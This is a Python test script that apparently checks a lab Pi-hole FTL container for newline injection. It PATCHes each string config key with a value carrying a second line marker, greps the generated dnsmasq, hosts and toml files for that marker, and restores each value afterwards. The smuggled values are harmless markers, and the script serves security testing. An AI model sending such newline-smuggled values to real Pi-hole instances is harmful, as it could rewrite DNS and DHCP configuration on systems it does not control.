#!/usr/bin/env python3
"""For every string / string-array config key, try to smuggle a second line into
whatever file FTL writes the value to (dnsmasq.conf, custom hosts, pihole.toml).
Reports which keys the API accepts with an embedded newline and whether the
marker ended up at the start of a line in a generated file.
usage: cfg_inject.py <target-ip> <container>"""
import json, subprocess, sys, time, urllib.request

T, C = sys.argv[1], sys.argv[2]

def req(method, path, body=None, sid=None):
    r = urllib.request.Request(f"http://{T}{path}", method=method,
                               data=json.dumps(body).encode() if body is not None else None,
                               headers={"sid": sid or "", "Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(r, timeout=20) as f: return f.status, json.loads(f.read() or b"{}")
    except urllib.error.HTTPError as e:
        try: return e.code, json.loads(e.read())
        except Exception: return e.code, {}
    except Exception as e:
        return 0, {"exc": str(e)}

def login():
    for _ in range(30):
        s, j = req("POST", "/api/auth", {"password": "test"})
        if s == 200 and j.get("session", {}).get("sid"): return j["session"]["sid"]
        time.sleep(1)
    raise SystemExit("login failed")

def nest(path, value):
    d = value
    for k in reversed(path): d = {k: d}
    return {"config": d}

sid = login()
_, cfg = req("GET", "/api/config?detailed=true", sid=sid)
keys = []
def walk(node, path):
    if isinstance(node, dict) and "flags" in node and "type" in node:
        if node["type"] in ("string", "string array"): keys.append((path, node))
        return
    if isinstance(node, dict):
        for k, v in node.items(): walk(v, path + [k])
walk(cfg["config"], [])

def grep_marker(marker):
    out = subprocess.run(["docker", "exec", C, "sh", "-c",
        f"grep -rlE '^{marker}' /etc/pihole/dnsmasq.conf /etc/pihole/hosts /etc/pihole/pihole.toml /etc/pihole/*.conf /etc/pihole/*.list 2>/dev/null"],
        capture_output=True, text=True).stdout.split()
    return out

accepted, injected = [], []
skip = {"webserver.acl", "webserver.port", "webserver.tls.cert", "ntp.sync.rtc.device", "webserver.api.password", "webserver.api.pwhash", "webserver.api.totp_secret", "webserver.api.app_pwhash"}
for path, node in keys:
    name = ".".join(path)
    if name in skip: continue
    marker = "INJ" + "".join(c for c in name if c.isalnum())
    cur = node["value"]
    samples = {"dns.hosts": "10.1.1.1 inj.lab", "dhcp.hosts": "aa:bb:cc:dd:ee:01,10.1.1.2", "dns.cnameRecords": "a.lab,b.lab",
               "dns.upstreams": "172.31.50.50", "dns.revServers": "true,10.0.0.0/8,172.31.50.50,lan"}
    base = samples.get(name, (cur[0] if isinstance(cur, list) and cur else cur if isinstance(cur, str) else "x") or "x")
    for sep in ("\n",):
        val = f"{base}{sep}{marker}=1"
        body = nest(path, [val] if node["type"] == "string array" else val)
        s, j = req("PATCH", "/api/config", body, sid)
        if s in (0, 401):
            time.sleep(2); s, j = req("PATCH", "/api/config", body, sid)
        if s != 200:
            print("refused ", name, s, (j.get("error") or {}).get("message", "")[:70], flush=True)
        if s == 200:
            time.sleep(1.5 if not node["flags"].get("restart_dnsmasq") else 4)
            hits = grep_marker(marker)
            accepted.append((name, repr(sep))); print("ACCEPTED", name, "-> files with marker:", hits, flush=True)
            if hits: injected.append((name, repr(sep), hits))
            # restore (the session survives FTL's internal restart)
            for _ in range(10):
                rs, _j = req("PATCH", "/api/config", nest(path, cur), sid)
                if rs == 200: break
                time.sleep(1)
            time.sleep(3 if node["flags"].get("restart_dnsmasq") else 0.3)
            break
print(f"string keys tested: {len(keys) - len(skip)}")
print("accepted a value containing a line break:", len(accepted))
for a in accepted: print("   ", a)
print("marker reached the start of a line in a generated file:", len(injected))
for i in injected: print("   ", i)
